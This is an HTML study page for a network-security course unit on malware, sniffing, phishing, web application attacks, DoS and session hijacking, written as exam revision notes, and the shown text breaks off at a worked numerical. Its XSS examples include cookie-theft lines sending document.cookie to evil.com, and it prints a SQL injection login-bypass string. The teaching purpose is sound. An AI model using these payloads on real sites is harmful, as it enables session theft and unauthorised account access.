@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Unit IV — Malware, Phishing &amp; DoS | CNS Field Manual</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body data-unit="unit4">
+
+<header class="topbar">
+  <span class="brand">⌗ CNS <span>FIELD MANUAL</span></span>
+  <nav>
+    <a href="index.html">Home</a>
+    <a href="unit1.html">Unit I</a>
+    <a href="unit2.html">Unit II</a>
+    <a href="unit3.html">Unit III</a>
+    <a href="unit4.html" class="active">Unit IV</a>
+    <a href="unit5.html">Unit V</a>
+    <a href="flashcards.html">Flashcards</a>
+    <a href="mindmap.html">Mind Map</a>
+    <a href="tools.html">Tools</a>
+    <a href="quiz.html">Quiz</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="search" id="searchBox" placeholder="Search this unit…" aria-label="Search this unit">
+  </div>
+</header>
+
+<div class="layout">
+  <nav class="sidebar" id="sidebar" aria-label="On this page"></nav>
+  <main class="content-wrap">
+    <div class="paper" id="content"></div>
+  </main>
+</div>
+
+<script type="text/markdown" id="md-source">
+# UNIT IV — Malware, Sniffing, Phishing, Web Application Attacks &amp; Denial-of-Service
+
+**Overall exam weightage estimate (relative to the full 5-unit course): 24%** — this unit crams the largest raw topic count of any unit (6 major attack families) but is almost entirely definitional/conceptual with very few numericals, so per-topic depth expected in answers is shallower than Unit II/III math-heavy content; it still commands high weightage because nearly every listed sub-topic (Trojan types, DoS types, phishing types) is independently exam-fodder for 2-mark/short-answer questions.
+
+## 1. TOPIC WEIGHTAGE ANALYSIS
+
+| # | Topic Group | Internal Weightage % | Tier | Why |
+|---|---|---|---|---|
+| 1 | Trojans & Backdoors (overt/covert channels, working, 6 types) | 15% | Must-Study | Very common for "explain types of Trojans" 10-mark questions; covert channel diagram is a favorite diagram question |
+| 2 | Viruses & Worms (characteristics, infection/attack phase) | 12% | Must-Study | Virus vs Worm distinction is asked almost every year as a comparison/short question |
+| 3 | Sniffers (spoofing, ARP poisoning, vulnerable protocols, types) | 12% | Must-Study | Frequently paired with MITM/session hijacking questions; ARP spoofing mechanism is a standard diagram/short answer |
+| 4 | Phishing (process + 9 attack types) | 15% | Must-Study | Large enumerable list = high probability of "list and explain any 5 types of phishing" style questions |
+| 5 | Web Application Security (auth, session mgmt, XSS, SQLi) | 18% | Must-Study | Highest practical/industry relevance; XSS and SQLi almost guaranteed as a full 10-mark question with example payloads |
+| 6 | Denial-of-Service (Smurf, Buffer Overflow, PoD, Teardrop, SYN flood, DDoS) | 16% | Must-Study | SYN flood + DDoS diagrams are recurring; also the only source of numericals in this unit |
+| 7 | Session Hijacking, Spoofing vs Hijacking, TCP/IP hijacking, CAPTCHA | 12% | Must-Study | Precise conceptual distinctions (spoofing vs hijacking) are a favorite "differentiate" question; CAPTCHA is often a quick 2-marker |
+
+**Overall note:** Unlike Unit II, almost nothing here is "Low-Yield" — the syllabus line is essentially a checklist of definitions and mechanisms, and examiners tend to pick directly off that checklist. Prioritize breadth of coverage (know every named sub-type in one line) over depth on any single item, except for XSS/SQLi and SYN flood/DDoS which deserve full worked explanations since they carry the highest individual-question probability.
+
+---
+
+## 2. COMPREHENSIVE THEORY
+
+### 2.1 Trojans and Backdoors
+
+**Definition:** A **Trojan Horse** is a malicious program disguised as (or bundled with) a legitimate, desirable piece of software, which the victim voluntarily installs/executes, thereby granting the attacker unauthorized access or functionality. Unlike a virus, a Trojan does **not self-replicate**. A **Backdoor** is any mechanism (installed by a Trojan, or left by a developer, or planted after a successful compromise) that bypasses normal authentication/access control to give an attacker persistent access to a system.
+
+#### Overt vs Covert Channels
+
+- **Overt channel:** A legitimate, sanctioned communication path within a system, explicitly designed for data transfer (e.g., a normal HTTP request-response, an FTP data connection). Both sender and receiver, and any observer, recognize this as intended traffic.
+- **Covert channel:** A communication path that **uses system resources or protocol fields not intended for communication**, to transfer information in a way that violates the system's security policy — typically to leak data out of a network past monitoring/firewalls, or to give an attacker remote control while blending in with normal traffic. Trojans commonly use covert channels (e.g., hiding C2 commands inside DNS queries, ICMP payloads, or unused/reserved header fields of legitimate protocols) so that IDS/firewalls, which only look for overt anomalies, do not flag the traffic.
+
+**ASCII diagram — covert channel hidden inside legitimate traffic:**
+
+```
+        Legitimate HTTP Request (Overt Channel)
+   ┌──────────────────────────────────────────────┐
+   │ GET /index.html HTTP/1.1                      │
+   │ Host: www.example.com                         │
+   │ User-Agent: Mozilla/5.0                       │
+   │ Cookie: session=Zx91Kq...  <── looks normal   │
+   └──────────────────────────────────────────────┘
+                       │
+                       ▼
+         Firewall / IDS inspects only known
+         signatures & expected fields → PASSES
+                       │
+                       ▼
+   ┌──────────────────────────────────────────────┐
+   │ Actual payload: Cookie value is Base64/XOR    │
+   │ encoded exfiltrated data or a C2 command,      │
+   │ e.g. "Zx91Kq..." decodes to "upload C:\pass.txt"│
+   └──────────────────────────────────────────────┘
+              Covert Channel (Hidden inside Cookie/
+              DNS TXT record / ICMP payload / unused
+              TCP header bits)
+```
+
+**Working of a Trojan — Client-Server Model:**
+1. **Wrapping/Delivery:** The attacker binds the malicious server component to a legitimate-looking file (game, crack, email attachment, fake update) — this is the "Trojan horse".
+2. **Execution by victim:** Victim runs the file. The **server component** (a.k.a. the Trojan payload) silently installs itself on the victim machine — commonly registering itself to auto-start (registry Run keys, scheduled tasks, services) and opening a listening port or making an outbound connection.
+3. **Connection establishment:** Two models exist —
+   - *Direct connection:* the **client** (attacker's controller program) connects directly to the port opened on the victim (server).
+   - *Reverse connection (more common today, bypasses NAT/firewalls):* the infected machine (acting as client) initiates an outbound connection to the attacker's listening server, since outbound connections are less scrutinized by firewalls.
+4. **Command & Control:** Once connected, the attacker sends commands through the channel — the victim's Trojan server executes them (file transfer, keystroke logs, screenshots, launching a shell, etc.) and returns results.
+5. **Persistence & stealth:** The Trojan hides its process (rootkit techniques), disables security software, and maintains the backdoor for repeated future access.
+
+**Types of Trojans (as per syllabus):**
+
+- **Remote Access Trojans (RATs):** Give the attacker full interactive remote control of the victim's desktop — file system browsing, screen capture, webcam/mic access, keylogging, registry editing — functionally equivalent to legitimate remote-desktop software but installed covertly (e.g., classic examples: Back Orifice, SubSeven, DarkComet).
+- **Data-Sending Trojans:** Designed purely for **information theft/exfiltration** — silently harvest saved passwords, keystrokes, browser autofill data, documents, cryptocurrency wallet files, and periodically send them to the attacker (via email, FTP, HTTP POST, or covert channel) without giving the attacker interactive control.
+- **Destructive Trojans:** Their sole purpose is **sabotage** — corrupt or delete files, format drives, or crash the OS/critical services; often triggered by a logic-bomb condition (specific date, or attacker command). No data theft or espionage motive, purely destructive.
+- **Proxy Trojans:** Convert the infected machine into a **proxy/relay server**, letting the attacker route their own traffic (spam, further attacks, anonymized browsing) through the victim's IP address, making the attacker's activity appear to originate from the victim and evading traceback.
+- **FTP Trojans:** Open **port 21 (FTP)** on the victim machine, turning it into an FTP server that the attacker (and potentially anyone who discovers the open port) can connect to, to upload/download arbitrary files from the compromised host.
+- **Security Software Disabler Trojans:** Specifically target and **kill or cripple antivirus, firewall, and IDS/IPS processes** running on the victim (by terminating processes, corrupting definition files, or blocking updates), clearing the way for other malware to operate undetected.
+
+---
+
+### 2.2 Viruses and Worms
+
+**Virus — defining characteristic:** A **computer virus** is a self-replicating piece of code that **attaches itself to a host program/file** and requires **human action** (running the infected program, opening the infected document, booting from infected media) to execute and spread. It cannot travel on its own between machines — it needs the host file to be copied/shared and then executed.
+
+**Worm — defining characteristic:** A **worm** is a standalone, self-replicating malicious program that **propagates automatically across networks without needing a host file or any user action**, typically by exploiting a vulnerability in a network service (e.g., a buffer overflow in an OS/service listening on a network port). It consumes bandwidth and system resources purely by mass-replication (e.g., Code Red, SQL Slammer, WannaCry — a worm+ransomware hybrid).
+
+| Aspect | Virus | Worm |
+|---|---|---|
+| Needs host file? | Yes, attaches to a program/document | No, standalone executable |
+| Needs user action to spread? | Yes (open/run the file) | No, spreads automatically over network |
+| Propagation speed | Slower (depends on human file-sharing) | Very fast (network-automated) |
+| Typical payload delivery | Via infected file execution | Via exploiting a service vulnerability |
+
+**Virus/Worm Lifecycle**
+
+**1. Infection Phase (Propagation):**
+This is the phase in which the malware focuses purely on **spreading and establishing presence**, generally without yet triggering visible damage:
+- **Search:** locate suitable targets — other executable files/documents on the local system (virus) or other reachable hosts on the network (worm, via scanning IP ranges/ports).
+- **Copy/Attach:** the virus inserts its code into the target file (prepending, appending, or overwriting sections, or infecting the boot sector); the worm copies its full executable to the new host, often by exploiting a remote vulnerability directly in memory (no file even needed, e.g., SQL Slammer lived entirely in memory).
+- **Conceal:** many variants employ stealth (polymorphic/metamorphic code changing their signature on each copy, encryption of the payload) to evade signature-based antivirus during this phase.
+- **Trigger check:** the malware checks a **trigger condition** (a specific date, number of executions, presence of a flag file, receipt of a C2 command) to decide when to move from dormant replication into the attack phase.
+
+**2. Attack Phase (Payload execution):**
+Once the trigger condition is satisfied, the malware executes its **payload** — the actual damaging or malicious action, which may include:
+- Deleting/corrupting files, encrypting data (ransomware behavior), formatting disks.
+- Consuming CPU/memory/network bandwidth to the point of denial-of-service (many worms cause outages purely via replication traffic even without a "malicious" payload).
+- Opening a backdoor, exfiltrating data, or turning the host into a botnet member for further attacks (e.g., DDoS participation).
+- Displaying a message/political statement, or simply causing visible mischief (early viruses like the classic "Stoned" or "Michelangelo").
+
+Not every malware sample has a distinct/damaging attack phase — some worms' only "attack" is the network congestion their replication itself causes.
+
+---
+
+### 2.3 Sniffers
+
+**Definition:** A **sniffer (packet analyzer/protocol analyzer)** is software/hardware that captures and inspects all traffic passing across a network interface/segment, decoding packets for analysis. Legitimately used for network troubleshooting (e.g., Wireshark, tcpdump); maliciously used to **eavesdrop and steal data** (credentials, session tokens, confidential content) in cleartext.
+
+**Passive vs Active Sniffing:**
+- **Passive sniffing:** occurs on a **hub-based (shared-medium) network**, where all traffic is broadcast to every port; the attacker simply listens without injecting any traffic — undetectable because no packets are altered/sent.
+- **Active sniffing:** required on a **switched network**, where a switch normally forwards frames only to the intended destination port (based on its MAC address table), so an attacker must **actively inject traffic** to manipulate this forwarding behavior and force traffic to be visible to them — this is where **spoofing** comes in.
+
+**Spoofing enabling sniffing on switched networks — ARP Spoofing/Poisoning:**
+- The switch's normal behavior isolates traffic per port, defeating passive sniffing. **ARP (Address Resolution Protocol) spoofing** exploits the fact that ARP has no authentication: the attacker sends forged **gratuitous ARP replies** to the victim and the gateway, falsely mapping the attacker's MAC address to the gateway's (or another host's) IP address.
+- Result: both the victim and gateway update their ARP caches with the attacker's MAC address as if it belonged to each other. All traffic between them now **flows through the attacker's machine** (classic **Man-in-the-Middle**), which can sniff it, optionally forward it on unmodified so the victim notices nothing.
+- Similarly, **MAC flooding** overwhelms a switch's CAM (Content Addressable Memory) table with a flood of forged MAC addresses; once the table is full, many switches **fail open**, reverting to hub-like broadcast behavior for all ports — enabling passive sniffing of everything.
+
+**Vulnerable protocols (cleartext protocols) and why:**
+| Protocol | Why vulnerable |
+|---|---|
+| **Telnet** | Sends login credentials and entire session content in plaintext — trivially readable by any sniffer |
+| **FTP** | Username/password sent unencrypted in the control channel before any file transfer |
+| **HTTP** | Requests/responses (including form logins, cookies/session IDs) transmitted unencrypted unless upgraded to HTTPS/TLS |
+| **SNMP (v1/v2c)** | Uses a "community string" as a cleartext shared secret for read/write access to network devices |
+| **POP (POP3)** | Mailbox username and password sent in cleartext during the login (`USER`/`PASS`) sequence |
+
+These protocols were designed before widespread threat models assumed a hostile network path, so they never encrypted the transport layer by default — modern replacements (SSH, FTPS/SFTP, HTTPS, SNMPv3, POP3S) add encryption/authentication.
+
+**Types of sniffing (attack techniques):**
+- **ARP sniffing/spoofing:** as above — poison ARP caches to redirect switched traffic through the attacker.
+- **DHCP sniffing/starvation & rogue DHCP:** attacker floods a DHCP server with bogus requests to exhaust its address pool (DHCP starvation), then stands up a **rogue DHCP server** to hand out attacker-controlled gateway/DNS settings to new clients, routing their traffic through the attacker.
+- **DNS sniffing/spoofing (cache poisoning):** attacker injects forged DNS responses (or compromises a DNS server/cache) so victim's domain-name lookups resolve to attacker-controlled IPs, allowing traffic interception.
+- **MAC flooding:** as above — overload switch CAM table to force hub-like broadcast behavior.
+
+---
+
+### 2.4 Phishing
+
+**Definition:** **Phishing** is a social-engineering attack in which the attacker impersonates a trustworthy entity (bank, colleague, service provider) — typically via email, SMS, or a fake website — to trick the victim into revealing sensitive information (credentials, card numbers) or performing an action that compromises security (clicking a malicious link, running an attachment).
+
+**General Phishing Process (Bait → Hook → Catch):**
+1. **Bait:** The attacker crafts a convincing lure — a spoofed email/SMS/website that appears to originate from a legitimate, trusted source, creating urgency or curiosity ("Your account will be suspended," "Invoice attached").
+2. **Hook:** The victim takes the bait — clicks the embedded malicious link (leading to a fake but visually identical login page) or opens a malicious attachment; this is the moment of engagement/deception.
+3. **Catch:** The victim submits credentials/data into the fake form (or the malware executes), and the attacker **captures/harvests** this data for account takeover, fraud, or further attacks (or the malware payload silently installs and begins its own attack chain).
+
+**Types of Phishing Attacks:**
+
+| Type | One-line mechanism |
+|---|---|
+| **Man-in-the-Middle (MITM) Phishing** | Attacker positions a proxy between victim and the real site, transparently relaying and capturing credentials/session tokens in real time (defeats even some OTP flows). |
+| **URL Obfuscation** | The displayed/clickable link is disguised using lookalike domains, IP-address URLs, encoded characters, or homograph (Unicode lookalike) characters so it visually resembles the legitimate URL while pointing elsewhere. |
+| **Hidden Attacks** | Malicious links/scripts are concealed using techniques like tiny/invisible iframes, hidden form fields, or misleading anchor text so the victim cannot see the true destination before clicking. |
+| **Client-side Vulnerabilities** | Exploits a bug/vulnerability in the victim's browser or email client (e.g., unpatched rendering engine) to execute code or redirect silently, without the victim needing to actively click anything suspicious. |
+| **Deceptive Phishing** | The classic mass-email approach — a generic, broadly-distributed message impersonating a known brand, relying purely on message deception (no exploit) to drive the victim to a fake login page. |
+| **Malware-Based Phishing** | The phishing message carries or links to a malicious attachment/executable that, once run, installs keyloggers/RATs/Trojans to steal data directly from the endpoint. |
+| **DNS-Based Phishing (Pharming)** | Attacker corrupts DNS resolution (via cache poisoning, host-file modification, or compromised DNS server) so that even the *correctly typed* legitimate URL resolves to a fraudulent IP address. |
+| **Content-Injection Phishing** | Attacker injects malicious content (a fake login form, script, or redirect) directly into a legitimate, otherwise-trustworthy website — e.g., via a compromised server or vulnerable input field — so the phishing content appears within a genuine domain. |
+| **Search Engine Phishing** | Attacker creates fraudulent websites/offers (too-good-to-be-true deals) and gets them indexed/ranked by search engines (via SEO or malvertising) so victims arrive via organic/paid search results rather than a direct link. |
+
+---
+
+### 2.5 Web Application Security
+
+#### Secure Authentication Mechanisms
+- **Multi-Factor Authentication (MFA):** Requires at least two independent factors — something you know (password), something you have (OTP token/authenticator app), something you are (biometric) — so a stolen password alone is insufficient for account takeover.
+- **Secure password storage:** Never store passwords in plaintext or with reversible encryption. Store a **salted hash**: `stored_value = Hash(password || unique_random_salt)`, using a slow, purpose-built algorithm (bcrypt, scrypt, Argon2 — not fast general-purpose hashes like MD5/SHA-1) to resist brute-force/rainbow-table attacks. The **salt** (unique per user) ensures identical passwords across users produce different hashes, defeating precomputed rainbow tables.
+- Additional practices: account lockout/rate-limiting after failed attempts, CAPTCHA on login forms, password complexity + breach-list checking.
+
+#### Secure Session Management
+- **Session tokens:** After authentication, the server issues a long, cryptographically random session ID (not predictable, not derived from user data) that the client presents on each subsequent request in place of re-authenticating.
+- **Expiry:** Sessions must have both an **idle timeout** (auto-expire after inactivity) and an **absolute timeout** (force re-login after a maximum duration), limiting the window of use for a stolen token.
+- **Cookie flags:**
+  - `Secure` — cookie is only ever sent over HTTPS, never in cleartext HTTP.
+  - `HttpOnly` — cookie is inaccessible to JavaScript (`document.cookie`), mitigating token theft via XSS.
+  - `SameSite` — restricts the cookie from being sent on cross-site requests, mitigating CSRF.
+- **Session fixation prevention:** The server must **issue a brand-new session ID upon successful login** (never reuse/accept a pre-login session ID), so an attacker cannot pre-set a known session ID on the victim (e.g., via a crafted link) and then hijack it after the victim authenticates under that same ID.
+
+#### Cross-Site Scripting (XSS)
+**Mechanism:** Attacker injects malicious client-side script (typically JavaScript) into a web page viewed by other users; because the browser trusts content served from the site's origin, the injected script executes with the site's privileges — able to steal cookies/session tokens, deface content, or perform actions as the victim.
+
+- **Reflected XSS:** The malicious script is part of the request (e.g., a URL query parameter) and is immediately echoed back unsanitized in the server's response — requires the attacker to trick the victim into clicking a crafted link. Example: a search URL whose `q` parameter is set to an inline script tag that runs `document.location = 'http://evil.com/steal?c=' + document.cookie`. If the search page reflects `q` directly into the HTML without encoding, the script runs in the victim's browser the moment they click the crafted link.
+- **Stored XSS:** The malicious script is **permanently saved** on the server (e.g., in a comment field, forum post, user profile) and served to every subsequent visitor who views that stored content — more dangerous since no crafted link/click is needed; every viewer is compromised. Example: a comment box that stores a script tag containing `fetch('http://evil.com/log?c='+document.cookie)` verbatim, which then fires for every user who views that comment thread.
+- **DOM-based XSS:** The vulnerability exists entirely in **client-side JavaScript** that writes attacker-controlled data (e.g., `location.hash`, `document.URL`) directly into the DOM (via `innerHTML`, `document.write`, etc.) without sanitization — the malicious payload never even needs to be sent to/reflected by the server; the flaw is purely in how the page's own script processes the URL/input.
+
+**Mitigation (common to all three):** context-aware output encoding/escaping of all user-controlled data before rendering, Content-Security-Policy (CSP) headers, and input validation.
+
+#### SQL Injection (SQLi)
+**Mechanism:** Attacker inserts malicious SQL fragments into an input field that is concatenated directly into a SQL query string, altering the query's logic to bypass authentication, extract unauthorized data, or modify/delete data.
+
+**Example — vulnerable query (string concatenation):**
+```sql
+SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passInput + "'";
+```
+**Injected input** into the `username` field: `' OR '1'='1' --`
+
+**Resulting query executed by the database:**
+```sql
+SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...';
+```
+Since `'1'='1'` is always true and `--` comments out the rest of the query (including the password check), the attacker logs in as the first user in the table **without knowing any valid password**.
+
+**Why parameterized queries (prepared statements) fix it:** With a parameterized query, e.g.
+```sql
+SELECT * FROM users WHERE username = ? AND password = ?
+```
+the user-supplied values are sent to the database **separately from the query structure**, bound as literal data values rather than being parsed as part of the SQL syntax. The database driver never re-interprets the input as SQL code, so injected quotes/operators/comment markers have no special meaning and are treated as literal (harmless) string content — the query logic can no longer be altered by input, regardless of what characters the attacker submits.
+
+**Other common web vulnerabilities (brief):**
+- **CSRF (Cross-Site Request Forgery):** forces an authenticated victim's browser to submit an unwanted request to a site where they're logged in (mitigated by anti-CSRF tokens + `SameSite` cookies).
+- **Broken access control / IDOR (Insecure Direct Object Reference):** an attacker manipulates a reference (e.g., changing `?id=101` to `?id=102`) to access another user's data because the server fails to verify authorization.
+- **Security misconfiguration:** default credentials, verbose error messages leaking stack traces, unnecessary open ports/services left enabled.
+
+---
+
+### 2.6 Denial-of-Service (DoS) Attacks
+
+**General definition:** A **DoS attack** aims to make a service/resource unavailable to legitimate users, typically by exhausting a finite resource (bandwidth, CPU, memory, or connection state).
+
+- **Smurf Attack (ICMP broadcast amplification):** Attacker sends a large number of ICMP Echo Request ("ping") packets with a **spoofed source address equal to the victim's IP**, directed to the **broadcast address** of an intermediary network. Every host on that broadcast network replies with an ICMP Echo Reply — but since the source was spoofed, all replies flood the victim instead of the attacker. A single attacker packet thus generates N reply packets (N = number of live hosts on the broadcast network) directed at the victim — a massive **amplification**.
+- **Buffer Overflow:** Attacker sends input data exceeding the size a program's fixed-length buffer was allocated to hold; without proper bounds-checking, the excess data overwrites adjacent memory (including the return address on the stack), which can crash the service (DoS) or, worse, allow the attacker to redirect execution to injected malicious code (remote code execution).
+- **Ping of Death:** Attacker sends a **maliciously oversized or malformed ICMP packet** (historically, fragmented such that the reassembled packet exceeds the maximum legal IP packet size of 65,535 bytes) to the target; older/unpatched TCP/IP stacks that failed to handle reassembly of such oversized packets would crash, freeze, or reboot upon processing it.
+- **Teardrop Attack:** Attacker sends a series of **IP fragments with deliberately overlapping and inconsistent fragment offset values**. When the vulnerable target's OS attempts to reassemble these fragments according to the (invalid/overlapping) offsets, the reassembly logic fails/crashes (particularly affected older Windows/Linux kernels lacking proper offset validation).
+- **SYN Attack / SYN Flooding (TCP handshake exhaustion):** Exploits the TCP three-way handshake. The attacker sends a flood of TCP SYN packets, usually with spoofed/unreachable source IP addresses, and never completes the handshake. The victim allocates a connection-state entry in its **backlog queue** for each half-open connection and waits (until timeout) for the final ACK that never arrives — once the backlog queue is full, the server can no longer accept **any** legitimate new connections.
+
+  **ASCII diagram — normal 3-way handshake vs half-open SYN flood:**
+  ```
+  Normal 3-Way Handshake                Half-Open SYN Flood
+  ─────────────────────                 ─────────────────────
+  Client         Server                 Attacker(spoofed)      Server
+    │──── SYN ─────▶│                       │──── SYN(spoofed IP1)──▶│  (queue slot 1 used)
+    │◀─── SYN-ACK ──│                       │──── SYN(spoofed IP2)──▶│  (queue slot 2 used)
+    │──── ACK ─────▶│                       │──── SYN(spoofed IP3)──▶│  (queue slot 3 used)
+    │  connection    │                       │        ...            │  ...
+    │  ESTABLISHED   │                       │──── SYN(spoofed IPn)──▶│  (queue FULL)
+                                             │  Server sends SYN-ACK to spoofed
+                                             │  (unreachable) IPs → no ACK ever
+                                             │  returns → backlog stays full →
+                                             │  legitimate clients' SYNs get DROPPED
+  ```
+- **DDoS (Distributed Denial-of-Service):** A DoS attack launched **simultaneously from a large number of compromised machines (a botnet)**, coordinated by the attacker, so the attack traffic is distributed across many source IPs — making the volume far larger than a single machine could generate and making IP-based blocking/traceback far harder.
+
+  **ASCII diagram — attacker → botnet → victim:**
+  ```
+                              ┌────────────┐
+                              │  Attacker  │
+                              │ (C2 Server)│
+                              └─────┬──────┘
+                        commands to │ botnet
+             ┌───────────┬──────────┼──────────┬───────────┐
+             ▼           ▼          ▼          ▼           ▼
+         ┌───────┐   ┌───────┐  ┌───────┐  ┌───────┐   ┌───────┐
+         │ Bot 1 │   │ Bot 2 │  │ Bot 3 │  │ Bot 4 │   │ Bot N │  (zombie/
+         └───┬───┘   └───┬───┘  └───┬───┘  └───┬───┘   └───┬───┘   infected hosts)
+             │           │          │          │           │
+             └───────────┴──────────┼──────────┴───────────┘
+                       flood of traffic converges
+                                    ▼
+                             ┌────────────┐
+                             │   Victim   │  ← overwhelmed, legitimate
+                             │   Server   │    users cannot connect
+                             └────────────┘
+  ```
+
+### 2.7 Session Hijacking
+
+**Mechanism:** The attacker **takes over an already-authenticated, active session** between a legitimate client and server by stealing or predicting the session's identifying token (session ID/cookie, or TCP sequence numbers), thereafter impersonating the legitimate user without needing their credentials at all.
+
+**Spoofing vs Hijacking — precise distinction:**
+
+| Aspect | Spoofing | Hijacking |
+|---|---|---|
+| Timing | Occurs **before** a session is established — attacker pretends to be someone else from the start | Occurs **during/after** a legitimate session already exists — attacker takes over an in-progress session |
+| What is faked | Identity/address (IP, MAC, DNS, email sender) to initiate a deceptive interaction | Control of an existing authenticated session (session token/sequence numbers) |
+| Victim awareness | Victim may be interacting with the spoofer thinking it's legitimate from the start | The legitimate user was genuinely authenticated; attacker seizes it mid-way, often causing a desync/drop for the real user |
+| Example | ARP spoofing, IP spoofing, email spoofing | TCP session hijacking, cookie/session-token theft |
+
+**TCP/IP Hijacking (sequence number prediction):** TCP tracks each byte of a connection using 32-bit sequence numbers negotiated during the handshake. If an attacker can **sniff or predict the current sequence and acknowledgment numbers** of an active TCP session (easier on networks where the attacker can sniff traffic, or where the OS uses weak/predictable initial sequence number generation), they can **inject forged packets** that the receiving end accepts as legitimate continuation of the stream — effectively splicing themselves into the connection and potentially desynchronizing/kicking out the real client, taking over the session (e.g., an already-authenticated Telnet/FTP session).
+
+**CAPTCHA as a countermeasure:**
+- **What it protects against:** Automated, large-scale, script-driven attacks — credential-stuffing/brute-force login attempts, automated account creation, comment-spam bots, and automated form submission — by requiring proof that the requester is a human (distorted text, image selection, behavioral challenge) that is (was) hard for a simple script/bot to solve.
+- **Limits:** Does **not** protect against a determined human attacker, targeted manual attacks, session hijacking, or MITM (a CAPTCHA solved once does not prevent a stolen session token from being reused); modern OCR and CAPTCHA-solving farms/AI have eroded the effectiveness of simple text-based CAPTCHAs, pushing systems toward behavioral/risk-based CAPTCHA (e.g., reCAPTCHA v3) or MFA as complements.
+
+---
+
+## 3. KEY POINTS & COMPARISONS
+
+**Revision bullets:**
+- Trojan = disguised, non-self-replicating, needs user to run it; delivers a payload via client-server (or reverse-shell) model.
+- Covert channel = communication path abusing unintended fields/resources to hide data/commands from monitoring.
+- Virus needs a host file + user execution; worm is standalone and self-propagating over networks.
+- Malware lifecycle = Infection Phase (spread/conceal) → Attack Phase (trigger → payload executes).
+- Passive sniffing works on hubs; switched networks need active attacks (ARP spoofing, MAC flooding) to redirect traffic.
+- Cleartext protocols (Telnet, FTP, HTTP, SNMP, POP) leak credentials because they were never designed with encryption.
+- Phishing process = Bait → Hook → Catch; 9 named variants differ mainly in *delivery/deception mechanism*, not goal.
+- Secure auth = MFA + salted slow hashing (bcrypt/Argon2); secure sessions = random tokens + expiry + Secure/HttpOnly/SameSite cookies + fresh session ID on login.
+- XSS attacks the **client/browser** (script injection); SQLi attacks the **backend database** (query injection) — both stem from unsanitized/untrusted input.
+- Parameterized queries defeat SQLi by separating code from data; output encoding + CSP defeat XSS.
+- DoS = exhaust a resource (bandwidth/CPU/memory/connection table); DDoS = same, but distributed via botnet for scale + anonymity.
+- SYN flood exploits the **half-open connection backlog**; Smurf exploits **broadcast amplification**; Teardrop exploits **fragment reassembly logic**; Ping of Death exploits **oversized packet handling**.
+- Spoofing precedes/fakes identity before a session; hijacking seizes an already-live, authenticated session.
+- CAPTCHA stops bots, not targeted human attackers or session theft.
+
+**Table — Virus vs Worm vs Trojan:**
+
+| Feature | Virus | Worm | Trojan |
+|---|---|---|---|
+| Self-replicates? | Yes | Yes | No |
+| Needs host file? | Yes | No | No (but needs a carrier/wrapper file to be run once) |
+| Needs user action to spread? | Yes | No | Yes (to initially execute it) |
+| Propagation medium | Infected files/media, shared programs | Network (exploits vulnerabilities) | Social engineering (download/email) |
+| Primary purpose | Corrupt/replicate | Replicate/consume resources | Backdoor access / covert functionality |
+
+**Table — Spoofing vs Hijacking:**
+
+| Aspect | Spoofing | Hijacking |
+|---|---|---|
+| Occurs | Before session exists | During an existing session |
+| Fakes | Identity/address | Control of live session |
+| Example | ARP/IP/DNS/email spoofing | TCP session hijacking, cookie theft |
+
+**Table — XSS vs SQL Injection:**
+
+| Aspect | XSS | SQL Injection |
+|---|---|---|
+| Attack surface | Client-side (browser rendering of HTML/JS) | Server-side (database query layer) |
+| Injected content | JavaScript/HTML | SQL syntax |
+| Impact | Cookie/session theft, defacement, phishing within trusted site | Data theft/leak, auth bypass, data modification/deletion |
+| Fix | Output encoding, CSP, HttpOnly cookies | Parameterized queries/prepared statements, input validation, least-privilege DB accounts |
+
+**Table — DoS attack types (name | mechanism | layer exploited):**
+
+| Attack | Mechanism | Layer Exploited |
+|---|---|---|
+| Smurf | Spoofed ICMP echo to broadcast address → amplified replies flood victim | Network (ICMP/IP) |
+| Buffer Overflow | Oversized input overwrites memory/return address | Application/OS memory |
+| Ping of Death | Oversized/malformed ICMP packet crashes stack on reassembly | Network (ICMP/IP fragmentation) |
+| Teardrop | Overlapping fragment offsets break reassembly logic | Network (IP fragmentation) |
+| SYN Attack / SYN Flooding | Half-open TCP connections exhaust backlog queue | Transport (TCP) |
+| DDoS | Botnet-distributed flood (any of the above, at scale) | Any/multiple layers |
+
+**Table — Types of phishing (compact):**
+
+| Type | Mechanism |
+|---|---|
+| MITM Phishing | Transparent proxy intercepts credentials/tokens in real time |
+| URL Obfuscation | Lookalike/encoded URLs disguise true destination |
+| Hidden Attacks | Invisible iframes/fields conceal malicious links |
+| Client-side Vulnerabilities | Exploits browser/email-client bugs for silent compromise |
+| Deceptive Phishing | Generic mass email impersonating a trusted brand |
+| Malware-Based Phishing | Malicious attachment installs keylogger/RAT |
+| DNS-Based Phishing (Pharming) | DNS poisoning redirects even correctly-typed URLs |
+| Content-Injection Phishing | Malicious content injected into a genuine, trusted website |
+| Search Engine Phishing | Fraudulent sites ranked/indexed to attract organic search victims |
+
+---
+
+## 4. NUMERICALS & FORMULAS
+
+**Formula 1 — SYN flood: spoofed SYNs needed to fill a backlog:**
+If the server's listen backlog (queue) size is **N**, and the attacker sends spoofed SYNs at rate **R** packets/second, and each half-open entry persists for the SYN-ACK retransmission **timeout period T** (before the OS gives up and evicts it), then:
+
+- Number of spoofed SYN packets needed to fill the backlog once = **N** (simply one SYN per free queue slot).
+- Time to first exhaust the queue = **N / R** seconds.
+- To **keep the queue continuously full** (sustained DoS), the attacker must at least match the server's eviction rate: minimum sustained rate ≈ **N / T** packets/second (replace evicted entries as fast as they time out).
+
+**Formula 2 — Smurf attack amplification factor:**
+If the broadcast (intermediary) network has **N** live, ping-responsive hosts, then each single spoofed ICMP Echo Request sent by the attacker generates **N** ICMP Echo Replies directed at the victim.
+**Amplification factor = N** (i.e., traffic delivered to the victim = N × traffic sent by the attacker).
+If the attacker sends at rate **R** requests/sec, the victim receives traffic at rate **N × R** replies/sec.
+
+---
+
+**Worked Numerical 1 (SYN Flood):**
